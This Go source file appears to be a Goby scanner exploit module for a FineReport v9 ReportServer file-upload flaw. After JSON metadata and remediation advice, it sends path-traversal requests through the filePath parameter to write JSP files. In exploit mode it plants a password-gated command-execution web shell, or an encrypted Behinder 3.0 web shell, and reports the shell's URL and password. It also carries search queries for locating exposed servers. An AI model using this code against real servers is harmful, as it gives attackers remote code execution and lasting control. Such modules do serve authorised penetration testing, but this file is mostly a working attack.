package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "FineReport v9 ReportServer filePath file upload vulnerability",
    "Description": "<p>FineReport report software is an enterprise-level web report tool written in pure Java that integrates the functions of data display (report) and data entry (form). Simple drag-and-drop operations can design complex Chinese-style reports and build data decision-making analysis systems.</p><p>Since FineReport V9 does not limit the parameters passed in when initializing the svg file, it can overwrite and write data to the existing file, thereby obtaining server permissions by writing the Trojan horse into the jsp file.</p>",
    "Product": "FineReport",
    "Homepage": "http://www.fanruansem.com/",
    "DisclosureDate": "2021-05-03",
    "Author": "Sabia",
    "FofaQuery": "body=\"content=\\\"FineReport--Web Reporting Tool\\\"\"",
    "GobyQuery": "body=\"content=\\\"FineReport--Web Reporting Tool\\\"\"",
    "Level": "2",
    "Impact": "<p>When uploading files, if the server-side scripting language does not strictly verify and filter the uploaded files, it is possible to upload malicious script files, thereby controlling the entire website and even the server.</p>",
    "Recommendation": "<p>Strictly filter the value of the filePath parameter, or use the path and file suffix whitelist, delete the default update.jsp and update1.jsp pages, and upgrade FineReport to the latest version: <a href=\"https://www.fanruansem.com/finereport\">https://www.fanruansem.com/finereport</a></p>",
    "References": [
        "https://blog.csdn.net/qq_32261191/article/details/116375931"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "cmd,Behinder3.0"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "Information technology application innovation industry"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "帆软 v9 ReportServer 报表软件 ReportServer文件 filePath 参数文件上传漏洞",
            "Product": "帆软-FineReport",
            "Description": "<p>FineReport报表软件是一款纯Java编写的、集数据展示(报表)和数据录入(表单)功能于一身的企业级web报表工具，它“专业、简捷、灵活”的特点和无码理念，仅需简单的拖拽操作便可以设计复杂的中国式报表，搭建数据决策分析系统。<br></p><p>FineReport V9 由于在初始化svg文件时，未对传入的参数做限制，导致可以对已存在的文件覆盖写入数据，从而通过将木马写入jsp文件中获取服务器权限。<br></p>",
            "Recommendation": "<p>严格过滤filePath参数的值，或使用路径和文件后缀白名单，删除默认update.jsp和update1.jsp页面，升级FineReport到最新版:&nbsp;<a href=\"https://www.fanruansem.com/finereport\">https://www.fanruansem.com/finereport</a><br><br></p>",
            "Impact": "<p>上传文件的时候，如果服务器端脚本语言，未对上传的文件进行严格的验证和过滤，就有可能上传恶意的脚本文件，从而控制整个网站，甚至是服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "信创"
            ]
        },
        "EN": {
            "Name": "FineReport v9 ReportServer filePath file upload vulnerability",
            "Product": "FineReport",
            "Description": "<p>FineReport report software is an enterprise-level web report tool written in pure Java that integrates the functions of data display (report) and data entry (form). Simple drag-and-drop operations can design complex Chinese-style reports and build data decision-making analysis systems.</p><p>Since FineReport V9 does not limit the parameters passed in when initializing the svg file, it can overwrite and write data to the existing file, thereby obtaining server permissions by writing the Trojan horse into the jsp file.</p>",
            "Recommendation": "<p>Strictly filter the value of the filePath parameter, or use the path and file suffix whitelist, delete the default update.jsp and update1.jsp pages, and upgrade FineReport to the latest version: <a href=\"https://www.fanruansem.com/finereport\">https://www.fanruansem.com/finereport</a><br></p>",
            "Impact": "<p>When uploading files, if the server-side scripting language does not strictly verify and filter the uploaded files, it is possible to upload malicious script files, thereby controlling the entire website and even the server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "Information technology application innovation industry"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-22",
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randString := goutils.RandomHexString(16)
			uri := "/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/" + randString + ".svg.jsp"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "text/xml;charset=UTF-8")
			cfg.VerifyTls = false

			cfg.Data = fmt.Sprintf("{\"__CONTENT__\":\"<%%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\\\"ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\\\")));%%>\",\"__CHARSET__\":\"UTF-8\"}")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 {
					verifyUrl := fmt.Sprintf("%s/WebReport/%s", u.FixedHostInfo, randString+".svg.jsp")
					if res, err1 := httpclient.SimpleGet(verifyUrl); err1 == nil {
						if res.StatusCode == 200 && strings.Contains(res.Utf8Html, "e165421110ba03099a1c0393373c5b43") {
							return true
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			randName := goutils.RandomHexString(8)
			if ss.Params["AttackType"].(string) == "cmd" {
				uri := "/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/" + randName + ".svg.jsp"
				cfg := httpclient.NewPostRequestConfig(uri)
				cfg.Header.Store("Content-Type", "text/xml;charset=UTF-8")
				cfg.VerifyTls = false
				cmd := ss.Params["cmd"].(string)
				// cfg.Data = `{"__CONTENT__":"<% if(\"gobysecredteam666666\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(`+cmd+`).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(\"<pre>\");while((a=in.read(b))!=-1){out.println(new String(b));}out.print(\"</pre>\");new java.io.File(application.getRealPath(request.getServletPath())).delete();}else{response.sendError(407, \"Need authentication!!!\" );}%>"`,\"__CHARSET__\":\"UTF-8\"}";

				cfg.Data = `{"__CONTENT__":"<% if(\"test666666\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(\"` + cmd + `\").getInputStream();int a = -1;byte[] b = new byte[2048];out.print(\"<pre>\");while((a=in.read(b))!=-1){out.println(new String(b));}out.print(\"</pre>\");new java.io.File(application.getRealPath(request.getServletPath())).delete();}else{response.sendError(407, \"Need authentication!!!\" );}%>"` + `,"__CHARSET__":"UTF-8"}`
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 {
						verifyUrl := fmt.Sprintf("%s/WebReport/%s", expResult.HostInfo, randName+".svg.jsp?pwd=test666666")
						if res, err1 := httpclient.SimpleGet(verifyUrl); err1 == nil {
							if res.StatusCode == 200 {
								expResult.Output = res.RawBody
								expResult.Success = true
							}
						}
					}
				}
			} else if ss.Params["AttackType"].(string) == "Behinder3.0" {
				uri := "/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/" + randName + ".svg.jsp"
				cfg := httpclient.NewPostRequestConfig(uri)
				cfg.Header.Store("Content-Type", "text/xml;charset=UTF-8")
				cfg.VerifyTls = false
				// cfg.Data = `{"__CONTENT__":"<% if(\"gobysecredteam666666\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(`+cmd+`).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(\"<pre>\");while((a=in.read(b))!=-1){out.println(new String(b));}out.print(\"</pre>\");new java.io.File(application.getRealPath(request.getServletPath())).delete();}else{response.sendError(407, \"Need authentication!!!\" );}%>"`,\"__CHARSET__\":\"UTF-8\"}";

				cfg.Data = `{"__CONTENT__":"<%@page import=\"java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*\" %><%! private byte[] Decrypt(byte[] data) throws Exception { String k=\"e4goby9feb5d925b\"; javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),\"AES\")); byte[] decodebs; Class baseCls ; try{ baseCls=Class.forName(\"java.util.Base64\"); Object Decoder=baseCls.getMethod(\"getDecoder\", null).invoke(baseCls, null); decodebs=(byte[]) Decoder.getClass().getMethod(\"decode\", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data}); } catch (Throwable e) { System.out.println(\"444444\"); baseCls = Class.forName(\"sun.misc.BASE64Decoder\"); Object Decoder=baseCls.newInstance(); decodebs=(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)}); } return c.doFinal(decodebs); }%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){ ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] buf = new byte[512]; int length=request.getInputStream().read(buf); while (length>0) { byte[] data= Arrays.copyOfRange(buf,0,length); bos.write(data); length=request.getInputStream().read(buf); } new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}%>"` + `,"__CHARSET__":"UTF-8"}`
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 {
						expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + "/WebReport/" + randName + ".svg.jsp\n"
						expResult.Output += "Password：rebeyond\n"
						expResult.Output += "Webshell tool: Behinder v3.0"

						expResult.Success = true

					}
				}
			}

			return expResult
		},
	))
}
